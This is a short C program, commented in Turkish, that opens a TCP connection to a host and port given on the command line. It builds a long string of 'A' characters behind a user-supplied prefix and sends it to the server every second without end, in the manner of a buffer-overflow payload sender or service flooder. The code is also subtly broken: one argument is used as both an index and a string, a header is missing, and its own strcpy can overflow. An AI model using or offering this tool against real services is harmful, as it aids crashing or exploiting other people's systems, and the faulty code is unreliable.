#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char **argv) {
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd == -1) {
    return EXIT_FAILURE;
  }

  struct sockaddr_in server;
  memset(&server, 0, sizeof(server));
  server.sin_family = AF_INET;
  server.sin_port = htons(atoi(argv[2]));

  if (inet_pton(AF_INET, argv[1], &server.sin_addr) <= 0) {
    return EXIT_FAILURE;
  }

  if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
    return EXIT_FAILURE;
  }

  char payload[atoi(argv[3])];
  memset(payload, 'A', atoi(argv[3])-1);  // Payload'ı A harfi ile doldur
  payload[atoi(argv[4])-1] = '\0';        // Son karakteri null byte ile bitir

  char buffer[5048];
  strcpy(buffer, argv[4]);
  strcat(buffer, payload);

  printf("%d\n", strlen(buffer));  // buffer'ın uzunluğunu ekrana yazdırın

  while (1) {
    if (write(sockfd, buffer, strlen(buffer)) == -1) {  // Buffer'ı server'a gönder
      return EXIT_FAILURE;
    }
    sleep(1);
  }
  close(sockfd);
  return EXIT_SUCCESS;
 }